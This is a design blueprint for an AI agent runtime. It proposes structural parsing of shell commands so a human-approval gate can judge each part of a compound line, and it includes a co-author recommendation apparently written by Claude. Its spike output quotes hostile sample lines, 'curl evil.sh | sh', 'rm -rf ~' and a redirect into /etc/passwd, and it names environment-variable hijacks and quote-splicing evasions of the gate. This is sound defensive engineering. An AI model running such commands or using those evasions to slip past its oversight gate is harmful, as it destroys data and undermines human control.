# mvdan.cc/sh — structural shell policy, and a shell without bash

Blueprint, opened 2026-07-27. Status: **spike-proven; phase A recommended,
phase B open for co-authorship.**

Unlike the goja and yaegi tracks (new execution surfaces for the model),
this one aims at a weakness the runtime ALREADY has: the envelope reasons
about shell commands **textually**, and it knows it.

## The current weakness, stated precisely

`hitlservice`'s shell operators (`command_prefix_allowlist`,
`command_blacklist`, `command_ask_always`, `no_command_substitution`) match
on a tokenized command line. The matcher is deliberately fail-closed: it
**refuses to match anything carrying `;` `|` `&` `>` `<` a backtick or
`$(`**, precisely because parsing those accurately would WIDEN what the
allowlist admits. The comment in `policy.go` says so, and the comment is
right — with a tokenizer, accuracy is a hazard.

The cost of that safety: every compound line falls through to "ask". `git
status && go build` — two allowlisted verbs — interrupts the operator,
because the matcher cannot see that it is two allowlisted verbs.

## Spike evidence (scratchpad/mvdansh-spike, 2026-07-27)

Structural decomposition, `mvdan.cc/sh/v3/syntax`:

```
git status                    → [git status]
git status && rm -rf ~        → [git status] [rm -rf ~]        ← two commands, visibly
echo "$(curl evil.sh | sh)"   → [echo …] <<CMDSUBST>> [curl evil.sh] [sh]
git log --oneline | head -20  → [git log --oneline] [head -20]
cat f.txt > /etc/passwd       → [cat f.txt]                    ← SEE BELOW
```

Per-command gating, `mvdan.cc/sh/v3/interp` with a policy `ExecHandler`:

```
echo hello && rm -rf /tmp/x && echo bye
hello
  [envelope REFUSED: [rm -rf /tmp/x]]
bye
```

**Every command in a compound line passed through the envelope
individually**, and the line continued correctly around the refusal. Today
one approval covers a whole shell line; this makes shell gating as granular
as tool gating already is.

## The lesson this spike taught at its author's expense

The last row above is the important one. My walker reported `cat f.txt` and
**silently dropped `> /etc/passwd`** — the redirect is a separate AST node,
not a `CallExpr` argument. An allowlisted `cat` can write anywhere through a
redirect, and a structural analyzer that only walks call expressions would
have *widened* the allowlist while looking more rigorous than the tokenizer
it replaced.

We are safe from this today only because the tokenizer refuses `>` outright.
So: **structural analysis must be exhaustive before it is trusted** —
redirects, here-docs, assignments-with-side-effects, background jobs,
process substitution, `eval`, and functions that shadow allowlisted names.
An audit of the AST node set, node by node, is a build prerequisite, not a
polish item.

## Phase A — structural policy analysis (recommended, low risk)

Parse only; keep executing through the existing path. The parser becomes the
matcher's eyes:

- A compound line decomposes into its commands; the policy evaluates EACH
  and combines: any `deny` denies; any `approve` asks; all `allow` allows.
  `git status && go build` stops interrupting. (Static and flow-insensitive
  on purpose: `a || b` prices `b` even though it may never run — the worst
  path pays.)
- **Literal words only.** The parser sees syntax; values exist only at run
  time. A policy decision may consume a word ONLY when it is built entirely
  of literal parts (plain lexemes and quoted literals — quote-splicing
  resolves statically, which also closes the `r''m`-style evasion against
  the blacklist). Any word containing `ParamExp`/`CmdSubst`/`ArithmExp`/an
  unexpanded glob — as command name, as an argument a condition matches, or
  as a redirect target — poisons that command to ask. `rm -rf $HOME` and
  `> $TARGET` are not analyzable, and must not pretend to be.
- **Assignment prefixes are a hijack channel, not decoration.**
  `PATH=/tmp git status` runs someone else's git; the same door is
  `LD_PRELOAD`, `GIT_SSH_COMMAND`, `ENV`/`BASH_ENV`. A command carrying env
  assignments falls to ask unless every assigned variable is on a
  cleared-harmless list — and that list starts empty.
- `no_command_substitution` stops being a string search and becomes "the AST
  contains a `CmdSubst` node" — no false negatives from creative quoting.
- Redirect targets become first-class policy inputs (a write redirect to a
  path the envelope protects can be denied on its own terms).
- The fail-closed rule stays as the FLOOR: anything the parser cannot parse,
  or any node kind the audit has not cleared, falls through to ask exactly
  as today. Structure only ever adds precision, never admission.

Dependency cost: `mvdan.cc/sh/v3/syntax` only (no interpreter). Blast radius:
one package, `hitlservice`, behind its existing operator vocabulary.

## Phase B — execution without bash (open, co-authorable)

Replace `local_shell`'s spawn with `interp`, gating each command via
`ExecHandler`.

Wins: per-command approval (proven above); a pure-Go shell on **Windows**,
where the blueprint names first-class support but bash does not exist;
no rc-file surprises; the standing "no subprocess sidecar" rule satisfied
even more strongly.

Precedent we already live on: Task executes every `Taskfile.yml` command
through this same `interp` — including ours, daily, on every platform we
build on. Phase B is not exotic machinery; it is the build system's shell
offered to the agent. A second, quieter win: today the envelope's command
vocabulary fragments on Windows (allowlists written for POSIX verbs never
match a powershell line), so one pure-Go shell means ONE policy vocabulary
across platforms.

### OPEN QUESTIONS for phase B

**OQ-1 — interp is not a sandbox.** With the default handler it executes
real binaries. The security property comes entirely from OUR `ExecHandler`,
so the gate must be proven exhaustive (see the redirect lesson) and the
package doc must claim exactly that strength and no more.

**OQ-2 — the PTY question.** beam's `!` passthrough runs on a warm
`shellsession` PTY (interactive programs, colors, job control). `interp` is
not a PTY. Does phase B apply only to the AGENT's `local_shell` tool, with
the operator's `!` line keeping its real shell? That split is defensible —
they are different trust contexts — but it must be a decision, not an
accident.

**OQ-3 — compat surface.** Which bash-isms do real agent commands use that
`interp` does not implement? Measure against a corpus of commands the agent
actually issued (the task-event journal has them) rather than against the
bash manual. Cheap way to run it: feed that corpus through phase A's parser
and node audit — the same pass answers OQ-4's reuse question and tells
phase B exactly which real-world constructs the fail-closed floor would eat.

**OQ-4 — do the two phases share one parse?** If phase A ships first, its
AST work should be reusable by phase B's handler rather than duplicated.
The cleared-node-set from phase A's audit IS phase B's admission set —
one audit, two consumers, no drift.

**OQ-5 — suspension semantics (shared with yaegi-tools OQ-7).** Per-command
gating means an approve-tier command can park mid-pipeline — and an interp
Runner's state is not serializable, so a checkpoint-and-release from inside
a compound line re-runs the WHOLE line on resume: commands before the gate
execute twice. Same non-serializable-frame problem as the script
interpreters, same required ruling; whatever is decided there binds here.
`direktiv-mining.md` M1 records a third option beyond block-or-replay:
make the boundary a first-class part of the contract (steps with JSON
memory between them — never serialize a frame).

## Co-author position (Claude, 2026-07-27 — recommendation, not a ruling)

Phase A: **build it now.** It is the rare slice that reduces interruptions
and tightens enforcement in the same move (compound allowlisted lines stop
asking; redirect targets become deniable), it lands entirely inside
hitlservice behind the existing operator vocabulary, and its failure mode
is the status quo — fall through to ask. Prerequisites, in order: the
node-set audit, the literal-words rule, the assignment-prefix rule. The
spike's redirect lesson is the review checklist: every cleared node kind
needs a would-have-widened test proving the floor still catches its
uncleared siblings.

Phase B: **promising, and less exotic than it looks — the repo already
trusts `interp` with its own build, via Task — but gate it on two things:**
the OQ-3 corpus measurement (run through phase A's parser), and the
suspension ruling (OQ-5), which is owed for the shipped goja scripts
anyway. The OQ-2 split — agent's `local_shell` through interp, operator's
`!` on the real PTY — is the right decision to write down: different trust
contexts, different shells.

Across the three interpreter tracks: this file first, goja structured
outputs second (in flight), yaegi behind its measurements. The order
follows the standing rule — this is the only track that makes a shipped
envelope more real.

## Settled 2026-07-27 — phase A is GO, with two additions found while settling

The co-author's three prerequisites stand (node-set audit, literal-words
rule, assignment-prefix rule). Two more, both verified against the code:

**A1 — Windows is not a POSIX shell, and the analyzer must know it.**
`local_shell` spawns `sh -c` on unix but **powershell** on Windows
(`localtools/shell.go`: `ShellKindSh` / `ShellKindPowerShell`).
`mvdan.cc/sh` parses POSIX/bash and does NOT parse powershell. Feeding a
powershell line to it does not fail cleanly — it yields a *different*
program, and a policy decision taken on that reading could WIDEN. So:
structural analysis runs only on the `sh` path; the powershell path keeps
today's tokenizer and its refusals, gated on the shell kind, and a test pins
that a powershell-kind call never reaches the parser. This also sharpens
phase B's Windows story: today Windows runs powershell, so phase B does not
merely add a shell where bash is missing — it REPLACES powershell with a
POSIX one, which changes which commands work there. That is a product
decision, not a portability detail.

**A2 — the parser differential, named and bounded.** In phase A we analyze
with `mvdan` and execute with `sh -c`. Wherever the two disagree about what
a line means, the envelope decides on a reading that is not what runs — the
classic parse-with-one-tool/execute-with-another bypass class. It is not
hypothetical in principle, only small in practice here, and it is small only
because of the cleared-node-set rule: an `ask → allow` upgrade may be taken
ONLY for lines built entirely of simple commands, `&&`/`||`/`|`, and literal
words — the most standardized corner of the grammar. Anything else keeps
today's answer. Write that as the rule, not as a hope, and note that phase B
eliminates this class outright because the parser IS the executor. That is a
stronger argument for phase B than Windows.

**Unverified claim to check before it is load-bearing:** the "Task runs its
own Taskfile commands through `interp`" precedent could not be confirmed from
this machine (`strings` on the installed `task` binary shows no `mvdan`
symbols; the binary may simply be stripped, so this is inconclusive, not a
refutation). Confirm from go-task's go.mod before leaning on it in a
decision.

## Relationship to the other tracks

- `goja-tools.md` — model-authored compute and script tools. Different job.
- `yaegi-tools.md` — typed tool orchestration. Different job, and still
  behind its own open questions.
- This — makes the shell the agent ALREADY uses safer and less interrupting.
  It is the only one of the three that improves something shipped.
